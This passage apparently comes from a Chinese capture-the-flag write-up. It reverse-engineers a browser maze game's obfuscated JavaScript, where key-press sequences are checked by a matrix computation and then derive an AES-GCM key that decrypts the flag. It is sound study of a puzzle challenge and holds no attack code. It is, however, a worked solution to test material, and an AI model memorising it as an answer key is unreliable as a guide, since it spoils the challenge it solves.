e));<br>    &#125;<br>    <span class="hljs-keyword">var</span> e, t;<br>    i.<span class="hljs-property">c</span> = i.<span class="hljs-property">c</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> <span class="hljs-number">1</span> &amp; e ? <span class="hljs-number">3</span> : <span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">l</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> a;<br>    t.<span class="hljs-title function_">clearRect</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, e.<span class="hljs-property">width</span>, e.<span class="hljs-property">height</span>), <span class="hljs-title function_">o</span>(e.<span class="hljs-property">width</span> / <span class="hljs-number">2</span> - <span class="hljs-number">4</span>, e.<span class="hljs-property">height</span> / <span class="hljs-number">2</span> - <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>), i.<span class="hljs-property">h</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">t</span> =&gt;</span> &#123;<br>        <span class="hljs-title function_">o</span>(e.<span class="hljs-property">width</span> / <span class="hljs-number">2</span> - <span class="hljs-number">4</span> + <span class="hljs-number">40</span> * (t.<span class="hljs-property">x</span> - i.<span class="hljs-property">g</span>.<span class="hljs-property">x</span>), e.<span class="hljs-property">height</span> / <span class="hljs-number">2</span> - <span class="hljs-number">4</span> + <span class="hljs-number">40</span> * (t.<span class="hljs-property">y</span> - i.<span class="hljs-property">g</span>.<span class="hljs-property">y</span>), <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>);<br>    &#125;), [...<span class="hljs-title class_">Array</span>(i.<span class="hljs-property">f</span>.<span class="hljs-property">y</span>).<span class="hljs-title function_">keys</span>()].<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123;<br>        [...<span class="hljs-title class_">Array</span>(i.<span class="hljs-property">f</span>.<span class="hljs-property">x</span>).<span class="hljs-title function_">keys</span>()].<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">t</span> =&gt;</span> &#123;<br>            <span class="hljs-number">0</span> != (<span class="hljs-number">2</span> &amp; i.<span class="hljs-property">f</span>.<span class="hljs-property">z</span>[e][t]) &amp;&amp; <span class="hljs-title function_">o</span>(<span class="hljs-number">40</span> * (t - i.<span class="hljs-property">g</span>.<span class="hljs-property">x</span>), <span class="hljs-number">40</span> * (e - i.<span class="hljs-property">g</span>.<span class="hljs-property">y</span>), <span class="hljs-number">40</span>, <span class="hljs-number">1</span>), <span class="hljs-number">0</span> != (<span class="hljs-number">1</span> &amp; i.<span class="hljs-property">f</span>.<span class="hljs-property">z</span>[e][t]) &amp;&amp; <span class="hljs-title function_">o</span>(<span class="hljs-number">40</span> * (t - i.<span class="hljs-property">g</span>.<span class="hljs-property">x</span>), <span class="hljs-number">40</span> * (e - i.<span class="hljs-property">g</span>.<span class="hljs-property">y</span>), <span class="hljs-number">1</span>, <span class="hljs-number">40</span>);<br>        &#125;);<br>    &#125;), a = i.<span class="hljs-property">l</span>, t.<span class="hljs-property">textAlign</span> = <span class="hljs-string">&#x27;center&#x27;</span>, t.<span class="hljs-property">font</span> = <span class="hljs-string">&#x27;32px monospace&#x27;</span>, t.<span class="hljs-property">fillStyle</span> = <span class="hljs-string">&#x27;rgba(25, 255, 25, 255)&#x27;</span>, t.<span class="hljs-title function_">fillText</span>(a, e.<span class="hljs-property">width</span> / <span class="hljs-number">2</span>, e.<span class="hljs-property">height</span> / <span class="hljs-number">2</span>);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">e</span>) &#123;<br>    i.<span class="hljs-property">f</span>.<span class="hljs-property">z</span> = [...<span class="hljs-title class_">Array</span>(i.<span class="hljs-property">f</span>.<span class="hljs-property">y</span>).<span class="hljs-title function_">keys</span>()].<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">t</span> =&gt;</span> [...<span class="hljs-title class_">Array</span>(i.<span class="hljs-property">f</span>.<span class="hljs-property">x</span> - <span class="hljs-number">1</span>).<span class="hljs-title function_">keys</span>()].<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, n</span>) =&gt;</span> t &gt; <span class="hljs-number">0</span> &amp;&amp; t &lt; i.<span class="hljs-property">f</span>.<span class="hljs-property">x</span> - <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-title function_">c</span>(<span class="hljs-number">23</span> * n + <span class="hljs-number">7</span> * t + <span class="hljs-number">3</span> * e) &gt; <span class="hljs-number">0.5</span> == <span class="hljs-number">0</span> ? [<br>        [<br>            ...a[<span class="hljs-number">0</span>].<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, a[<span class="hljs-number">1</span>] + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title function_">c</span>(<span class="hljs-number">17</span> * n + <span class="hljs-number">9</span> * t + <span class="hljs-number">3</span> * e) * (n - a[<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>))),<br>            <span class="hljs-number">1</span> | a[<span class="hljs-number">0</span>][a[<span class="hljs-number">1</span>] + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title function_">c</span>(<span class="hljs-number">17</span> * n + <span class="hljs-number">9</span> * t + <span class="hljs-number">3</span> * e) * (n - a[<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>))],<br>            ...a[<span class="hljs-number">0</span>].<span class="hljs-title function_">slice</span>(a[<span class="hljs-number">1</span>] + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title function_">c</span>(<span class="hljs-number">17</span> * n + <span class="hljs-number">9</span> * t + <span class="hljs-number">3</span> * e) * (n - a[<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>)) + <span class="hljs-number">1</span>)<br>        ],<br>        n + <span class="hljs-number">1</span><br>    ] : [<br>        [<br>            ...a[<span class="hljs-number">0</span>].<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, n),<br>            <span class="hljs-number">2</span> | a[<span class="hljs-number">0</span>][n],<br>            ...a[<span class="hljs-number">0</span>].<span class="hljs-title function_">slice</span>(n + <span class="hljs-number">1</span>)<br>        ],<br>        a[<span class="hljs-number">1</span>]<br>    ], [<br>        t &lt; i.<span class="hljs-property">f</span>.<span class="hljs-property">x</span> - <span class="hljs-number">1</span> ? [<br>            <span class="hljs-number">1</span>,<br>            ...<span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(i.<span class="hljs-property">f</span>.<span class="hljs-property">x</span> - <span class="hljs-number">2</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">0</span>),<br>            <span class="hljs-number">1</span><br>        ] : <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(i.<span class="hljs-property">f</span>.<span class="hljs-property">x</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">0</span>),<br>        <span class="hljs-number">0</span><br>    ])).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e[<span class="hljs-number">0</span>]), i.<span class="hljs-property">h</span> = [...<span class="hljs-title class_">Array</span>(<span class="hljs-number">6</span>).<span class="hljs-title function_">keys</span>()].<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">t</span> =&gt;</span> (&#123;<br>        <span class="hljs-attr">x</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-number">30</span> * <span class="hljs-title function_">c</span>(<span class="hljs-number">17</span> * t + <span class="hljs-number">23</span> * e)),<br>        <span class="hljs-attr">y</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-number">30</span> * <span class="hljs-title function_">c</span>(<span class="hljs-number">23</span> * t + <span class="hljs-number">17</span> * e)),<br>        <span class="hljs-attr">name</span>: r[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-number">8</span> * <span class="hljs-title function_">c</span>(<span class="hljs-number">3</span> * t + <span class="hljs-number">21</span> * e))]<br>    &#125;));<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">e, t, a = <span class="hljs-number">800</span>, n = <span class="hljs-number">0.6</span>, r = <span class="hljs-number">0.03</span></span>) &#123;<br>    <span class="hljs-keyword">const</span> i = (e + t) % a;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-number">0.8</span> + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sin</span>(<span class="hljs-number">7</span> * e) * r) * <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-number">1</span>, n + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0.009</span> * (i - a / <span class="hljs-number">2</span>) ** <span class="hljs-number">2</span>));<br>&#125;<br>e.<span class="hljs-property">width</span> = <span class="hljs-number">600</span>, e.<span class="hljs-property">height</span> = <span class="hljs-number">600</span>, <span class="hljs-variable language_">document</span>.<span class="hljs-property">onkeydown</span> = <span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123;<br>    i.<span class="hljs-property">c</span>[i.<span class="hljs-property">d</span>.<span class="hljs-title function_">indexOf</span>(e.<span class="hljs-property">keyCode</span>)] |= <span class="hljs-number">1</span>;<br>&#125;, <span class="hljs-variable language_">document</span>.<span class="hljs-property">onkeyup</span> = <span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123;<br>    i.<span class="hljs-property">c</span>[i.<span class="hljs-property">d</span>.<span class="hljs-title function_">indexOf</span>(e.<span class="hljs-property">keyCode</span>)] = <span class="hljs-number">0</span>;<br>&#125;, <span class="hljs-title function_">f</span>(i.<span class="hljs-property">b</span>), <span class="hljs-keyword">function</span> <span class="hljs-title function_">e</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">y</span>(), <span class="hljs-title function_">l</span>(), i.<span class="hljs-property">a</span>++, <span class="hljs-title function_">requestAnimationFrame</span>(e);<br>&#125;();<br></code></pre></td></tr></table></figure><p>函数有很多，不过重点是在<code>y()</code>函数，这里面有<code>AES</code>，<code>decrypt</code>等比较敏感的字样。</p><p>现在就可以开始下断点调试，需要先把所有文件都下载下来，然后注意文件里面的路径需要修改一下，最后用浏览器打开<code>index.html</code>就可以在浏览器的控制台调试了。</p><p>把断点下在<code>y()</code>函数if语句后的第一行</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-16%2000.21.20.png" alt="截屏2024-01-16 00.21.20" style="zoom:50%;" /><p>会发现每次移动，都会断在这个地方，而如果把下在其他地方或者其他函数，就会不断的中断。因此说明找对了函数并也断在了合适的地方，因为迷宫肯定是需要每走一步就去判断有没有到终点等等，因此走一步断一步才是比较合理的。</p><p>可以去控制台打印一下变量<code>i</code>，看看这里面有啥</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-16%2000.08.20.png" alt="截屏2024-01-16 00.08.20" style="zoom:50%;" /><p>通过不断调试，可以确定如下信息</p><blockquote><p>i.f &#x3D;&gt; 迷宫信息，包括终点坐标和迷宫路径（40*40的数组）</p><p>i.g &#x3D;&gt; 玩家现在的坐标</p><p>i.h &#x3D;&gt; 迷宫中六个红点位的坐标</p><p>i.l &#x3D;&gt; 打印在屏幕上的信息</p></blockquote><p>其余信息目前则暂时不清楚。</p><p>现在可以再把断点语句给整理一下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (i.<span class="hljs-property">g</span>.<span class="hljs-property">x</span> === i.<span class="hljs-property">f</span>.<span class="hljs-property">x</span> - <span class="hljs-number">9</span> &amp;&amp; i.<span class="hljs-property">g</span>.<span class="hljs-property">y</span> === i.<span class="hljs-property">f</span>.<span class="hljs-property">y</span> - <span class="hljs-number">9</span>) &#123;<br>    i.<span class="hljs-property">g</span>.<span class="hljs-property">x</span> = -<span class="hljs-number">7</span>,<br>        i.<span class="hljs-property">g</span>.<span class="hljs-property">y</span> = -<span class="hljs-number">7</span>,<br>        i.<span class="hljs-property">i</span> = [],<br>        i.<span class="hljs-property">j</span> = <span class="hljs-number">1</span>,<br>        i.<span class="hljs-property">k</span> = <span class="hljs-number">0</span>,<br>        <span class="hljs-title function_">f</span>(++i.<span class="hljs-property">b</span>),<br>        <span class="hljs-number">4</span> !== i.<span class="hljs-property">b</span> || <span class="hljs-number">4</span> !== i.<span class="hljs-property">e</span>.<span class="hljs-property">length</span> || i.<span class="hljs-property">e</span>.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> -<span class="hljs-number">1</span> === e) || <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br>            <span class="hljs-keyword">const</span> t = i.<span class="hljs-property">e</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>)<br>                .<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;0&#x27;</span>))<br>                .<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>),<br>                a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(<span class="hljs-title function_">atob</span>(e).<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>))),<br>                n = <span class="hljs-title class_">Uint8Array</span>.<span class="hljs-title function_">from</span>([<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>]),<br>                r = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextEncoder</span>().<span class="hljs-title function_">encode</span>(t),<br>                c = <span class="hljs-keyword">await</span> crypto.<span class="hljs-property">subtle</span>.importKey(<span class="hljs-string">&#x27;raw&#x27;</span>, r, &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;AES-GCM&#x27;</span> &#125;, !<span class="hljs-number">1</span>, [<span class="hljs-string">&#x27;decrypt&#x27;</span>]), o = <span class="hljs-keyword">await</span> crypto.<span class="hljs-property">subtle</span>.<span class="hljs-title function_">decrypt</span>(&#123;<br>                    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;AES-GCM&#x27;</span>,<br>                    <span class="hljs-attr">iv</span>: n<br>                &#125;, c, a);<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextDecoder</span>().<span class="hljs-title function_">decode</span>(o);<br>        &#125;(n).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> i.<span class="hljs-property">l</span> = e);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里大概流程就是先判断有没有到终点，然后将信息重置，调用一下<code>f(++i.b)</code>，这里猜测是重新生成迷宫，<code>i.b</code>用来记录迷宫的层数。然后满足一定条件后就可以进入下面的解密环节。</p><p>这里有个JS条件语句的判断特点即</p><blockquote><p>a&#x3D;&#x3D;x &amp;&amp; b&#x3D;&#x3D;y &amp;&amp; c 等价于 if (a&#x3D;&#x3D;x &amp;&amp; b&#x3D;&#x3D;y) {c}</p><p>a &#x3D;&#x3D; x || b&#x3D;&#x3D;y || c 等价于 if(!(a&#x3D;&#x3D;x || b&#x3D;&#x3D;y)) {c}</p></blockquote><p>那么这里<code>4 !== i.b || 4 !== i.e.length || i.e.some(e =&gt; -1 === e) || async function (e) &#123;...&#125;</code>就等价于<code>if(!(4 !== i.b || 4 !== i.e.length || i.e.some(e =&gt; -1 === e)))&#123;async function (e) &#123;...&#125;&#125;</code>，也就是想要解密需要满足这几个条件</p><blockquote><ol><li>i.b &#x3D;&#x3D; 4 即通过四层迷宫</li><li>i.e.length &#x3D;&#x3D;4 这个暂时不知道是什么</li><li>i.e 这个数组没有 -1</li></ol></blockquote><p>因此现在核心又转到<code>i.e</code>的生成上，往前看就有<code>i.e</code>的生成方式，也就是断点那个地方</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-16%2000.22.30.png" alt="截屏2024-01-16 00.22.30" style="zoom:50%;" /><p>同样把这一句话的JS给整理一下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js">i.<span class="hljs-property">j</span> &lt;&lt;= <span class="hljs-number">2</span>;<br>i.<span class="hljs-property">j</span> |= <span class="hljs-number">3</span> &amp; i.<span class="hljs-property">d</span>[i.<span class="hljs-property">c</span>.<span class="hljs-title function_">findIndex</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> <span class="hljs-number">1</span> === e)];<br><br><span class="hljs-keyword">if</span> (i.<span class="hljs-property">j</span> &gt;= <span class="hljs-number">64</span>) &#123;<br>    i.<span class="hljs-property">i</span>.<span class="hljs-title function_">push</span>((<span class="hljs-number">63</span> &amp; i.<span class="hljs-property">j</span>) - <span class="hljs-number">32</span>);<br>    i.<span class="hljs-property">j</span> = <span class="hljs-number">1</span>;<br>&#125;<br><br>i.<span class="hljs-property">k</span> = i.<span class="hljs-property">k</span> + <span class="hljs-number">211</span> * (i.<span class="hljs-property">g</span>.<span class="hljs-property">x</span> + <span class="hljs-number">9</span>) * (i.<span class="hljs-property">g</span>.<span class="hljs-property">y</span> + <span class="hljs-number">9</span>) * <span class="hljs-number">239</span> &amp; <span class="hljs-number">4294967295</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-number">16</span> == i.<span class="hljs-property">i</span>.<span class="hljs-property">length</span> &amp;&amp; <span class="hljs-number">1</span> === i.<span class="hljs-property">j</span>) &#123;<br>    e = [...<span class="hljs-title class_">Array</span>(<span class="hljs-number">4</span>).<span class="hljs-title function_">keys</span>()].<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> i.<span class="hljs-property">i</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">4</span> * e, <span class="hljs-number">4</span> * e + <span class="hljs-number">4</span>));<br>    t = a[i.<span class="hljs-property">b</span>];<br>    data = e.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> t[<span class="hljs-number">0</span>].<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">e, a</span>) =&gt;</span> t.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e[a])).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">t</span> =&gt;</span> e.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">a, n</span>) =&gt;</span> e[n] * t[n]).<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">e, t</span>) =&gt;</span> e + t)));<br>    data = <span class="hljs-title function_">flatMap</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(<span class="hljs-number">100</span> * e) / <span class="hljs-number">100</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">e, t</span>) =&gt;</span> <span class="hljs-number">1</span> === e ? t + <span class="hljs-number">1</span> : e).<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e)<br><br>    i.<span class="hljs-property">e</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">&#x27;1,6,11,16&#x27;</span> == data ? i.<span class="hljs-property">k</span> : -<span class="hljs-number">1</span>)<br>&#125;;<br><br></code></pre></td></tr></table></figure><p>直接看最后的比较语句，若<code>data == &#39;1,6,11,16&#39;</code>（这里的<code>data</code>是自己增加的变量，用于拆分运算，便于审计)，那么<code>i.e</code>就会压入一个<code>i.k</code>否则就压入<code>-1</code>那么就会失败。这个<code>data</code>又是通过<code>e</code>和<code>t</code>的运算得到，这里的<code>e</code>是通过<code>[...Array(4).keys()].map(e =&gt; i.i.slice(4 * e, 4 * e + 4))</code>语句得到，也就是<code>i.i</code>，而<code>t</code>则是已知的一个数组</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-16%2000.27.55.png" alt="截屏2024-01-16 00.27.55" style="zoom: 67%;" /><p>因此现在又需要知道<code>i.i</code>是怎么得到的，就继续往前看</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (i.<span class="hljs-property">j</span> &gt;= <span class="hljs-number">64</span>) &#123;<br>    i.<span class="hljs-property">i</span>.<span class="hljs-title function_">push</span>((<span class="hljs-number">63</span> &amp; i.<span class="hljs-property">j</span>) - <span class="hljs-number">32</span>);<br>    i.<span class="hljs-property">j</span> = <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里会有<code>i.i</code>的操作，<code>i.j</code>则是这又这两个操作得到</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">i.<span class="hljs-property">j</span> &lt;&lt;= <span class="hljs-number">2</span>;<br>i.<span class="hljs-property">j</span> |= <span class="hljs-number">3</span> &amp; i.<span class="hljs-property">d</span>[i.<span class="hljs-property">c</span>.<span class="hljs-title function_">findIndex</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> <span class="hljs-number">1</span> === e)];<br></code></pre></td></tr></table></figure><p>其中<code>i.d</code>和<code>i.c</code>都是已知数组</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-16%2000.30.30.png" alt="截屏2024-01-16 00.30.30"></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-16%2000.32.49.png" alt="截屏2024-01-16 00.32.49"></p><p>结合移动只有上下左右四个方向，猜测这里就应该对应四个方向，下个断点</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-16%2000.34.00.png" alt="截屏2024-01-16 00.34.00" style="zoom:50%;" /><p>发现确实如此，即每个方向都对应一个值。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C++">down -&gt; <span class="hljs-number">40</span>  &amp; <span class="hljs-number">3</span>  = <span class="hljs-number">00</span><br>right -&gt; <span class="hljs-number">39</span>  &amp; <span class="hljs-number">3</span>  = <span class="hljs-number">11</span><br>left -&gt; <span class="hljs-number">37</span>  &amp; <span class="hljs-number">3</span>  = <span class="hljs-number">01</span><br>up -&gt; <span class="hljs-number">38</span>  &amp; <span class="hljs-number">3</span>  = <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p>那么这段语句实际含义就是这样子，每走一步，取这步对应的两位值，每次走了三步后减32再push进<code>i.i</code>  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">i.<span class="hljs-property">j</span> &lt;&lt;= <span class="hljs-number">2</span>;<br>i.<span class="hljs-property">j</span> |= <span class="hljs-number">3</span> &amp; i.<span class="hljs-property">d</span>[i.<span class="hljs-property">c</span>.<span class="hljs-title function_">findIndex</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> <span class="hljs-number">1</span> === e)];<br><br><span class="hljs-keyword">if</span> (i.<span class="hljs-property">j</span> &gt;= <span class="hljs-number">64</span>) &#123;<br>    i.<span class="hljs-property">i</span>.<span class="hljs-title function_">push</span>((<span class="hljs-number">63</span> &amp; i.<span class="hljs-property">j</span>) - <span class="hljs-number">32</span>);<br>    i.<span class="hljs-property">j</span> = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">11</span> <span class="hljs-number">10</span><br><span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">11</span> <span class="hljs-number">11</span><br><span class="hljs-number">01</span> <span class="hljs-number">11</span> <span class="hljs-number">11</span> <span class="hljs-number">11</span><br>i.<span class="hljs-property">i</span>.<span class="hljs-title function_">push</span>(<span class="hljs-number">01</span> <span class="hljs-number">11</span> <span class="hljs-number">11</span> <span class="hljs-number">11</span> - <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>)<br></code></pre></td></tr></table></figure><p>那么现在就知道了<code>i.i</code>的生成方式，重新回头看那个if判断语句</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (<span class="hljs-number">16</span> == i.<span class="hljs-property">i</span>.<span class="hljs-property">length</span> &amp;&amp; <span class="hljs-number">1</span> === i.<span class="hljs-property">j</span>) &#123;<br>    e = [...<span class="hljs-title class_">Array</span>(<span class="hljs-number">4</span>).<span class="hljs-title function_">keys</span>()].<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> i.<span class="hljs-property">i</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">4</span> * e, <span class="hljs-number">4</span> * e + <span class="hljs-number">4</span>));<br>    t = a[i.<span class="hljs-property">b</span>];<br>    data = e.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> t[<span class="hljs-number">0</span>].<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">e, a</span>) =&gt;</span> t.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e[a])).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">t</span> =&gt;</span> e.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">a, n</span>) =&gt;</span> e[n] * t[n]).<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">e, t</span>) =&gt;</span> e + t)));<br>    data = data.<span class="hljs-title function_">flatMap</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(<span class="hljs-number">100</span> * e) / <span class="hljs-number">100</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">e, t</span>) =&gt;</span> <span class="hljs-number">1</span> === e ? t + <span class="hljs-number">1</span> : e).<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e)<br><br>    i.<span class="hljs-property">e</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">&#x27;1,6,11,16&#x27;</span> == data ? i.<span class="hljs-property">k</span> : -<span class="hljs-number">1</span>)<br>&#125;;<br></code></pre></td></tr></table></figure><p><code> e = [...Array(4).keys()].map(e =&gt; i.i.slice(4 * e, 4 * e + 4));</code>这个语句会生成一个4*4数组</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-16%2009.50.20.png" alt="截屏2024-01-16 09.50.20" style="zoom:50%;" /><p>验证一下两个语句的作用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span 